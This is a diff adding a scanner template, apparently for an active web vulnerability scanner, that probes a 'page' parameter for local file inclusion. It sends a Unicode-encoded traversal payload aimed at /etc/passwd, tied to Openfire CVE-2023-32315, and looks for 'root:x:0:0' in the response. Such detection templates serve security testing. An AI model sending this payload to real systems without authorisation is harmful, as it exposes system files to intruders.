@@ -1,0 +1,23 @@
+id: patt-lfi-unicode-01-page
+name: 'PATT lfi patt-lfi-unicode-01 via page'
+severity: high
+type: active
+tags:
+  - lfi
+  - patt
+  - encodeunicode
+requires:
+  - java
+  - dotnet
+description: 'PATT Unicode Encoding %u002f (Openfire CVE-2023-32315). [patt:patt-lfi-unicode-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      page:
+        - '..%u002f..%u002fetc%u002fpasswd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
